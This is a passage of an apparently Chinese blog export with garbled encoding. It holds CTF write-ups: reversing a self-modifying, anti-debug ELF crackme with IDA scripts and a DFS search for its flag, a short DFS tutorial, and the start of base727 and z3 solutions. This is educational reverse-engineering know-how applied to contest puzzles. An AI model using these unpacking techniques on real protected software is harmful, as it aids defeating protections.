<p>å¯ä»¥çœ‹å¾—å‡ºæ¥å…¶å®è¿™æ˜¯ä¸ª64ä½ç¨‹åº å†æ ¹æ®è¡¨å¤´ç­‰åç§»ä¹Ÿå¯ä»¥çœ‹å‡ºå®é™…ä¸Šè¿™åº”è¯¥æ˜¯ä¸€ä¸ªå°ç«¯åºELF æ›´æ”¹æ–‡ä»¶å¤´ä¸­å¯¹åº”çš„æ ‡å¿—ä½ å†æ¬¡æ‰“å¼€IDAå¯ä»¥çœ‹åˆ°<code>start</code>å…¥å£:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:000005C7D084C137                               start:</span><br><span class="line">LOAD:000005C7D084C137 48 8D 35 32 04 00 00          lea     rsi, unk_5C7D084C570</span><br><span class="line">LOAD:000005C7D084C13E 48 C7 C1 14 00 00 00          mov     rcx, 14h</span><br><span class="line">LOAD:000005C7D084C145 49 B8 F7 51 A4 C4 C0 28 FC 8F mov     r8, 8FFC28C0C4A451F7h</span><br><span class="line">LOAD:000005C7D084C145</span><br><span class="line">LOAD:000005C7D084C14F</span><br><span class="line">LOAD:000005C7D084C14F                               loc_5C7D084C14F:                        ; CODE XREF: LOAD:000005C7D084C156â†“j</span><br><span class="line">LOAD:000005C7D084C14F 4C 31 06                      xor     [rsi], r8</span><br><span class="line">LOAD:000005C7D084C152 48 83 C6 08                   add     rsi, 8</span><br><span class="line">LOAD:000005C7D084C156 E2 F7                         loop    loc_5C7D084C14F</span><br><span class="line">LOAD:000005C7D084C156</span><br><span class="line">LOAD:000005C7D084C158 E9 13 04 00 00                jmp     near ptr unk_5C7D084C570</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªSMC å†é€šè¿‡<code>strace</code>æŒ‡ä»¤å¯ä»¥çœ‹åˆ°å¯ç”¨äº†<code>ptrace</code>åè°ƒè¯•:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;./technically_correct&quot;, [&quot;./technically_correct&quot;], 0x7ffde09bb8d8 /* 32 vars */) = 0</span><br><span class="line">ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç¼–å†™ä¸€ä¸ªè„šæœ¬æ¥è¿›è¡ŒSMC:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x5C7D084C570</span></span><br><span class="line">xorkey = <span class="number">0x8FFC28C0C4A451F7</span></span><br><span class="line"><span class="built_in">round</span> = <span class="number">0x14</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">round</span>):</span><br><span class="line">    idc.patch_qword(start + <span class="number">8</span> * i, idc.get_qword(start + <span class="number">8</span> * i) ^ xorkey)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Round %d: 0x%016X&quot;</span> % (i, start + <span class="number">8</span> * i))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¤„ç†åçš„æ±‡ç¼–ä»£ç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:000005C7D084C570                               loc_5C7D084C570:                        ; CODE XREF: LOAD:000005C7D084C158â†‘j</span><br><span class="line">LOAD:000005C7D084C570                                                                       ; DATA XREF: LOAD:startâ†‘o</span><br><span class="line">LOAD:000005C7D084C570 90                            nop                                     ; Keypatch filled range [0x5C7D084C570:0x5C7D084C576] (7 bytes), replaced:</span><br><span class="line">LOAD:000005C7D084C570                                                                       ;   mov eax, 65h</span><br><span class="line">LOAD:000005C7D084C570                                                                       ;   syscall</span><br><span class="line">LOAD:000005C7D084C571 90                            nop</span><br><span class="line">LOAD:000005C7D084C572 90                            nop</span><br><span class="line">LOAD:000005C7D084C573 90                            nop</span><br><span class="line">LOAD:000005C7D084C574 90                            nop</span><br><span class="line">LOAD:000005C7D084C575 90                            nop</span><br><span class="line">LOAD:000005C7D084C576 90                            nop</span><br><span class="line">LOAD:000005C7D084C577 85 C0                         test    eax, eax</span><br><span class="line">LOAD:000005C7D084C579 0F 85 84 00 00 00             jnz     loc_5C7D084C603</span><br><span class="line">LOAD:000005C7D084C579</span><br><span class="line">LOAD:000005C7D084C57F 5E                            pop     rsi</span><br><span class="line">LOAD:000005C7D084C580 48 83 FE 02                   cmp     rsi, 2</span><br><span class="line">LOAD:000005C7D084C584 7C 58                         jl      short no                        ; no</span><br><span class="line">LOAD:000005C7D084C584</span><br><span class="line">LOAD:000005C7D084C586 5E                            pop     rsi</span><br><span class="line">LOAD:000005C7D084C587 5E                            pop     rsi</span><br><span class="line">LOAD:000005C7D084C588 48 BB E8 88 1F BC 84 0F 00 00 mov     rbx, 0F84BC1F88E8h</span><br><span class="line">LOAD:000005C7D084C588</span><br><span class="line">LOAD:000005C7D084C592</span><br><span class="line">LOAD:000005C7D084C592                               loc_5C7D084C592:                        ; CODE XREF: LOAD:000005C7D084C5CDâ†“j</span><br><span class="line">LOAD:000005C7D084C592 0F B6 06                      movzx   eax, byte ptr [rsi]             ; get input</span><br><span class="line">LOAD:000005C7D084C595 3C 0A                         cmp     al, 0Ah</span><br><span class="line">LOAD:000005C7D084C597 74 36                         jz      short yes_1</span><br><span class="line">LOAD:000005C7D084C597</span><br><span class="line">LOAD:000005C7D084C599 3C 00                         cmp     al, 0</span><br><span class="line">LOAD:000005C7D084C59B 74 32                         jz      short yes_1</span><br><span class="line">LOAD:000005C7D084C59B</span><br><span class="line">LOAD:000005C7D084C59D 3C 7E                         cmp     al, 7Eh ; &#x27;~&#x27;</span><br><span class="line">LOAD:000005C7D084C59F 77 3D                         ja      short no                        ; no</span><br><span class="line">LOAD:000005C7D084C59F</span><br><span class="line">LOAD:000005C7D084C5A1 2C 20                         sub     al, 20h ; &#x27; &#x27;</span><br><span class="line">LOAD:000005C7D084C5A3 72 39                         jb      short no                        ; no</span><br><span class="line">LOAD:000005C7D084C5A3</span><br><span class="line">LOAD:000005C7D084C5A5</span><br><span class="line">LOAD:000005C7D084C5A5                               loc_5C7D084C5A5:                        ; CODE XREF: LOAD:000005C7D084C60Câ†“j</span><br><span class="line">LOAD:000005C7D084C5A5 48 8D 14 C3                   lea     rdx, [rbx+rax*8]                ; 0xF84BC1F88E8 + input[i]</span><br><span class="line">LOAD:000005C7D084C5A9 48 8B 1A                      mov     rbx, [rdx]                      ; mem[0xF84BC1F88E8 + input[i]]</span><br><span class="line">LOAD:000005C7D084C5AC 48 31 D3                      xor     rbx, rdx                        ; 0xF84BC1F88E8 + input[i] ^ mem[0xF84BC1F88E8 + input[i]]</span><br><span class="line">LOAD:000005C7D084C5AF 49 B8 93 E6 C1 48 3C CB 16 B2 mov     r8, 0B216CB3C48C1E693h</span><br><span class="line">LOAD:000005C7D084C5B9 49 0F AF D8                   imul    rbx, r8                         ;  0xF84BC1F88E8 + input[i] ^ mem[0xF84BC1F88E8 + input[i]] * 0xB216CB3C48C1E693</span><br><span class="line">LOAD:000005C7D084C5BD 49 B8 9D 52 7C 26 D3 C6 00 C2 mov     r8, 0C200C6D3267C529Dh</span><br><span class="line">LOAD:000005C7D084C5C7 4C 01 C3                      add     rbx, r8                         ;  0xF84BC1F88E8 + input[i] ^ mem[0xF84BC1F88E8 + input[i]] * 0xB216CB3C48C1E693 + 0xC200C6D3267C529D</span><br><span class="line">LOAD:000005C7D084C5CA 48 FF C6                      inc     rsi                             ; i++</span><br><span class="line">LOAD:000005C7D084C5CD EB C3                         jmp     short loc_5C7D084C592           ; get input</span><br><span class="line">LOAD:000005C7D084C5CD</span><br><span class="line">LOAD:000005C7D084C5CF                               ; ---------------------------------------------------------------------------</span><br><span class="line">LOAD:000005C7D084C5CF</span><br><span class="line">LOAD:000005C7D084C5CF                               yes_1:                                  ; CODE XREF: LOAD:000005C7D084C597â†‘j</span><br><span class="line">LOAD:000005C7D084C5CF                                                                       ; LOAD:000005C7D084C59Bâ†‘j</span><br><span class="line">LOAD:000005C7D084C5CF 48 B9 E0 0B C0 8F 03 07 00 00 mov     rcx, 7038FC00BE0h</span><br><span class="line">LOAD:000005C7D084C5D9 48 39 CB                      cmp     rbx, rcx</span><br><span class="line">LOAD:000005C7D084C5DC 74 0C                         jz      short yes                       ; yes</span><br><span class="line">LOAD:000005C7D084C5DC</span><br><span class="line">LOAD:000005C7D084C5DE</span><br><span class="line">LOAD:000005C7D084C5DE                               no:                                     ; CODE XREF: LOAD:000005C7D084C584â†‘j</span><br><span class="line">LOAD:000005C7D084C5DE                                                                       ; LOAD:000005C7D084C59Fâ†‘j</span><br><span class="line">LOAD:000005C7D084C5DE                                                                       ; LOAD:000005C7D084C5A3â†‘j</span><br><span class="line">LOAD:000005C7D084C5DE 68 6E 6F 0A 00                push    0A6F6Eh                         ; no</span><br><span class="line">LOAD:000005C7D084C5E3 BA 03 00 00 00                mov     edx, 3</span><br><span class="line">LOAD:000005C7D084C5E8 EB 0A                         jmp     short loc_5C7D084C5F4</span><br><span class="line">LOAD:000005C7D084C5E8</span><br><span class="line">LOAD:000005C7D084C5EA                               ; ---------------------------------------------------------------------------</span><br><span class="line">LOAD:000005C7D084C5EA</span><br><span class="line">LOAD:000005C7D084C5EA                               yes:                                    ; CODE XREF: LOAD:000005C7D084C5DCâ†‘j</span><br><span class="line">LOAD:000005C7D084C5EA 68 79 65 73 0A                push    0A736579h                       ; yes</span><br><span class="line">LOAD:000005C7D084C5EF BA 04 00 00 00                mov     edx, 4</span><br><span class="line">LOAD:000005C7D084C5EF</span><br><span class="line">LOAD:000005C7D084C5F4</span><br><span class="line">LOAD:000005C7D084C5F4                               loc_5C7D084C5F4:                        ; CODE XREF: LOAD:000005C7D084C5E8â†‘j</span><br><span class="line">LOAD:000005C7D084C5F4 B8 01 00 00 00                mov     eax, 1</span><br><span class="line">LOAD:000005C7D084C5F9 BF 01 00 00 00                mov     edi, 1</span><br><span class="line">LOAD:000005C7D084C5FE</span><br><span class="line">LOAD:000005C7D084C5FE                               loc_5C7D084C5FE:                        ; CODE XREF: LOAD:000005C7D084C616â†“j</span><br><span class="line">LOAD:000005C7D084C5FE 48 89 E6                      mov     rsi, rsp</span><br><span class="line">LOAD:000005C7D084C601 0F 05                         syscall                                 ; write</span><br><span class="line">LOAD:000005C7D084C601</span><br><span class="line">LOAD:000005C7D084C603</span><br><span class="line">LOAD:000005C7D084C603                               loc_5C7D084C603:                        ; CODE XREF: LOAD:000005C7D084C579â†‘j</span><br><span class="line">LOAD:000005C7D084C603 B8 3C 00 00 00                mov     eax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">LOAD:000005C7D084C608 31 FF                         xor     edi, edi</span><br><span class="line">LOAD:000005C7D084C60A 0F 05                         syscall </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨<a href="https://filippo.io/linux-syscall-table/%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8ID">https://filippo.io/linux-syscall-table/æŸ¥æ‰¾ç³»ç»Ÿè°ƒç”¨ID</a> ç›®çš„æ˜¯è¾“å‡º<code>yes</code> flagé€šè¿‡å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥ å…·ä½“é€»è¾‘å†™åœ¨æ³¨é‡Šä¸­ ç”¨<code>readelf -a</code>è¯»å‡ºæ‰€æœ‰è™šæ‹Ÿå†…å­˜:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 a8 9e b6 21 74 80 06 55 b8 e5 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           168 &lt;unknown&gt;</span><br><span class="line">  OS/ABI:                            &lt;unknown: 9e&gt;</span><br><span class="line">  ABI Version:                       182</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0xc7b4d76e</span><br><span class="line">  Entry point address:               0x5c7d084c137</span><br><span class="line">  Start of program headers:          58 (bytes into file)</span><br><span class="line">  Start of section headers:          39047220244264590 (bytes into file)</span><br><span class="line">  Flags:                             0xb214c4dd</span><br><span class="line">  Size of this header:               16830 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         61</span><br><span class="line">  Size of section headers:           1 (bytes)</span><br><span class="line">  Number of section headers:         0</span><br><span class="line">  Section header string table index: 47031 &lt;corrupt: out of range&gt;</span><br><span class="line"></span><br><span class="line">There are no section groups in this file.</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000001000 0x00000265a3ce8000 0xc28f4b0d8a362161</span><br><span class="line">                 0x0000000000001000 0x0000000000001000  RWE    0x3cc4d55e9677dc9e</span><br><span class="line">  LOAD           0x0000000000002000 0x00000516ef99c000 0x3656c86e821bb521</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">  LOAD           0x000000000003c000 0x00000ae8f3641000 0x8da8b4d80a2f5556</span><br><span class="line">                 0x0000000000001000 0x0000000000001000  RWE    0x3fce6f654e1eaf66</span><br><span class="line">  LOAD           0x000000000003d000 0x00000ccd481d4000 0x353d5269c3fd6e77</span><br><span class="line">                 0x0000000000001000 0x0000000000001000  RWE    0x10eaf695dc252738</span><br><span class="line"></span><br><span class="line">There is no dynamic section in this file.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ•°æ®åœ¨è™šæ‹Ÿå†…å­˜å’Œå…¶åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ç›¸å¯¹æ–‡ä»¶å¤´çš„åç§»çš„å…³ç³»æ˜¯<code>data_offset = seg_offset + data_virtaddr - seg_virtaddr</code> æ®æ­¤å¯ä»¥å†™å‡ºè„šæœ¬è§£å¯†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># segment_addr = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 0x00000265a3ce8000</span></span><br><span class="line"><span class="comment"># 0x00000516ef99c000</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># 0x00000ae8f3641000</span></span><br><span class="line"><span class="comment"># 0x00000ccd481d4000</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># segment_start = [int(k, 16) for k in segment_addr.split(&quot;\n&quot;)[1:-1]]</span></span><br><span class="line">segment_start = [<span class="number">2635563171840</span>, <span class="number">5596067250176</span>, <span class="number">242648760320</span>, <span class="number">5890218143744</span>, <span class="number">2735873134592</span>, <span class="number">12132385898496</span>, <span class="number">16697267249152</span>, <span class="number">3326682263552</span>, <span class="number">10460356464640</span>, <span class="number">8642733731840</span>, <span class="number">988726030336</span>, <span class="number">8708637028352</span>, <span class="number">2773839282176</span>, <span class="number">8133109415936</span>, <span class="number">3575512096768</span>, <span class="number">9797392764928</span>, <span class="number">1880326082560</span>, <span class="number">5535382552576</span>, <span class="number">5309783875584</span>, <span class="number">14846201360384</span>, <span class="number">15151867842560</span>, <span class="number">1420534173696</span>, <span class="number">3162423922688</span>, <span class="number">9884210810880</span>, <span class="number">3293418479616</span>, <span class="number">2848477061120</span>, <span class="number">9760137510912</span>, <span class="number">13268869967872</span>, <span class="number">6355754991616</span>, <span class="number">15773356351488</span>, <span class="number">17095304347648</span>, <span class="number">11089330114560</span>, <span class="number">8872599801856</span>, <span class="number">119536611328</span>, <span class="number">11962295312384</span>, <span class="number">14545242775552</span>, <span class="number">6175697338368</span>, <span class="number">3295986577408</span>, <span class="number">4857408086016</span>, <span class="number">1006577762304</span>, <span class="number">6169422487552</span>, <span class="number">10338827309056</span>, <span class="number">5784443174912</span>, <span class="number">7711878021120</span>, <span class="number">15179293179904</span>, <span class="number">2675108958208</span>, <span class="number">5810459635712</span>, <span class="number">15978780405760</span>, <span class="number">15805306486784</span>, <span class="number">12812716527616</span>, <span class="number">13144427872256</span>, <span class="number">5770609094656</span>, <span class="number">14127787970560</span>, <span class="number">17062766280704</span>, <span class="number">7485916786688</span>, <span class="number">3136088481792</span>, <span class="number">12072940883968</span>, <span class="number">3003644882944</span>, <span class="number">7554512248832</span>, <span class="number">11995632111616</span>, <span class="number">14075817705472</span>]</span><br><span class="line"><span class="comment"># base = ((base + input[i]) ^ mem[base + input[i]]) * 0xB216CB3C48C1E693 + 0xC200C6D3267C529D</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_physddr</span>(<span class="params">addr:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(segment_start)):</span><br><span class="line">        <span class="keyword">if</span> addr - segment_start[i] &gt;= <span class="number">0</span> <span class="keyword">and</span> addr - segment_start[i] &lt; <span class="number">0x1000</span>:</span><br><span class="line">            <span class="keyword">return</span> (i + <span class="number">1</span>) * <span class="number">0x1000</span> + addr - segment_start[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">musk1 = <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line">musk2 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;technically_correct_edit&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = [<span class="built_in">ord</span>(i) - <span class="number">0x20</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;lactf&#123;&quot;</span>]</span><br><span class="line">    base = <span class="number">0xF84BC1F88E8</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    flags = []</span><br><span class="line">    stack = <span class="built_in">list</span>()</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data1 = (flag[i] * <span class="number">0x8</span> + base) &amp; musk2</span><br><span class="line">        f.seek(find_physddr(data1))</span><br><span class="line">        data2 = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">8</span>), byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        data3 = data1 ^ data2</span><br><span class="line">        data4 = (data3 * <span class="number">0xB216CB3C48C1E693</span>) &amp; musk1</span><br><span class="line">        base = (data4 + <span class="number">0xC200C6D3267C529D</span>) &amp; musk2</span><br><span class="line">        <span class="comment"># print(hex(base))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(flag):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        visited.add(base)</span><br><span class="line">        </span><br><span class="line">    stack.append((base, flag))</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        base, flag = stack.pop()</span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">in</span> visited:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        visited.add(base)</span><br><span class="line">        <span class="keyword">if</span> base == <span class="number">0x7038FC00BE0</span>:</span><br><span class="line">            flags.append(flag)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x5E</span>):</span><br><span class="line">            <span class="keyword">if</span> find_physddr((char * <span class="number">0x8</span> + base) &amp; musk2):</span><br><span class="line">                data1 = (char * <span class="number">0x8</span> + base) &amp; musk2</span><br><span class="line">                f.seek(find_physddr(data1))</span><br><span class="line">                data2 = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">8</span>), byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">                data3 = data1 ^ data2</span><br><span class="line">                data4 = (data3 * <span class="number">0xB216CB3C48C1E693</span>) &amp; musk1</span><br><span class="line">                base_ = (data4 + <span class="number">0xC200C6D3267C529D</span>) &amp; musk2</span><br><span class="line">                stack.append((base_, flag + [char]))</span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i + <span class="number">0x20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br><span class="line">    <span class="comment"># lactf&#123;i_l0v3_l1nux_elf_p4rs1ng&#125;</span></span><br></pre></td></tr></table></figure>



<p>ä»¥åé‡åˆ°å†æ›´æ–°åº”ç”¨æ¡ˆä¾‹â€¦</p>
]]></content>
      <categories>
        <category>æ‚é¡¹</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶æ ¼å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>1!ç§’é’Ÿå¯„!ä¸€ä¸ªç®—æ³•:DFS-æ·±åº¦ä¼˜å…ˆæœç´¢</title>
    <url>/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h3 id="ç®—æ³•æ¦‚è¿°"><a href="#ç®—æ³•æ¦‚è¿°" class="headerlink" title="ç®—æ³•æ¦‚è¿°"></a>ç®—æ³•æ¦‚è¿°</h3><p>DFSç”¨äºæ‰¾åˆ°å›¾ä¸­ä»ç»™å®šèµ·ç‚¹åˆ°ç»ˆç‚¹æ‰€æœ‰æ— äº¤ç‚¹è·¯çº¿(æˆ‘çŒœçš„) å¹¶ä¸ä¿è¯å…¨éƒ¨è·¯çº¿éƒ½èƒ½æ‰¾åˆ° ä¹Ÿä¸ä¿è¯æ‰¾åˆ°çš„è·¯çº¿æ˜¯æœ€çŸ­çš„</p>
<p> å› ä¸ºCTFé‡åˆ°è¿‡å¥½å‡ æ¬¡ æ‰€ä»¥å­¦ä¹ ä¸€ä¸‹</p>
<span id="more"></span>

<h3 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dfs_iterative_paths</span>(<span class="params">graph, start, end = start</span>):</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    stack = [(start, [start])]</span><br><span class="line"></span><br><span class="line">    paths = []</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node, path = stack.pop()</span><br><span class="line">        visited.add(node)</span><br><span class="line">        <span class="keyword">if</span> node == end:</span><br><span class="line">            paths.append(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[node]:</span><br><span class="line">            <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                stack.append((neighbor, path + [neighbor]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
        <category>å›¾è®º</category>
      </categories>
      <tags>
        <tag>ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>osu!gamingCTFéƒ¨åˆ†wp</title>
    <url>/2024/03/04/osu-gamingCTF%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT</p>
<p>ç¬‘ç‚¹è§£æ:osuæœ‰CTF CTFæœ‰osu</p>
<span id="more"></span>

<h2 id="Crypto-base727-baseç¼–ç -ç¼–ç è½¬åŒ–"><a href="#Crypto-base727-baseç¼–ç -ç¼–ç è½¬åŒ–" class="headerlink" title="Crypto&#x2F;base727 | baseç¼–ç  | ç¼–ç è½¬åŒ–"></a>Crypto&#x2F;base727 | baseç¼–ç  | ç¼–ç è½¬åŒ–</h2><p>é¢˜ç›®ç»™å‡ºçš„åŠ å¯†è„šæœ¬å’Œç»“æœ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base_727</span>(<span class="params">string</span>):</span><br><span class="line">    base = <span class="number">727</span></span><br><span class="line">    encoded_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded_value = encoded_value * <span class="number">256</span> + <span class="built_in">ord</span>(char)</span><br><span class="line"></span><br><span class="line">    encoded_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> encoded_value &gt; <span class="number">0</span>:</span><br><span class="line">        encoded_string = <span class="built_in">chr</span>(encoded_value % base) + encoded_string</span><br><span class="line">        encoded_value //= base</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encoded_string</span><br><span class="line"></span><br><span class="line">encoded_string = encode_base_727(flag)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encoded_string.encode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 06c3abc49dc4b443ca9d65c8b0c386c4b0c99fc798c2bdc5bccb94c68c37c296ca9ac29ac790c4af7bc585c59d</span></span><br></pre></td></tr></table></figure>

<p><code>chr()</code>å‡½æ•°å°†å‚æ•°è½¬åŒ–ä¸ºå¯¹åº”çš„Unicodeå­—ç¬¦ è€Œ<code>.encode()</code>æ–¹æ³•å°†è¯¥å­—ç¬¦è½¬åŒ–ä¸ºUTF-8ç¼–ç  æ‰€ä»¥ä¸èƒ½ç›´æ¥å°†ç»“æœ<code>unhexlify</code>åè¿›è¡Œè§£å¯† è€Œéœ€è¦å…ˆè¿›è¡ŒUTF-8è§£ç  å…³äºåŠ å¯†çš„é€»è¾‘ æ— éæ˜¯10è¿›åˆ¶-&gt;256è¿›åˆ¶-&gt;727è¿›åˆ¶ å€’æ¨å³å¯ ä»¥ä¸‹æ˜¯è§£å¯†è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base_727</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    base = <span class="number">727</span></span><br><span class="line">    decoded_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encoded_string:</span><br><span class="line">        decoded_value = decoded_value * base + <span class="built_in">ord</span>(char)</span><br><span class="line"></span><br><span class="line">    decoded_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> decoded_value &gt; <span class="number">0</span>:</span><br><span class="line">        decoded_string = <span class="built_in">chr</span>(decoded_value % <span class="number">256</span>) + decoded_string</span><br><span class="line">        decoded_value //= <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line">encoded = binascii.unhexlify(<span class="string">b&#x27;06c3abc49dc4b443ca9d65c8b0c386c4b0c99fc798c2bdc5bccb94c68c37c296ca9ac29ac790c4af7bc585c59d&#x27;</span>).decode(encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(decode_base_727(encoded))</span><br><span class="line"></span><br><span class="line"><span class="comment"># osu&#123;wysiwysiwysiywsywiwywsi&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Reverse-SAT-before-osu-z3"><a href="#Reverse-SAT-before-osu-z3" class="headerlink" title="Reverse&#x2F;SAT-before-osu | z3"></a><strong>Reverse</strong>&#x2F;SAT-before-osu | z3</h2><p>ç›´æ¥å°†é¢˜ç›®ç»™å‡ºçš„å…³ç³»å¡åˆ°z3æ±‚è§£å™¨ä¸­:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sol = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the variables</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = Int(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">e = Int(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">f = Int(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">g = Int(<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">h = Int(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">i = Int(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">j = Int(<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">k = Int(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">l = Int(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">m = Int(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">n = Int(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">o = Int(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">r = Int(<span 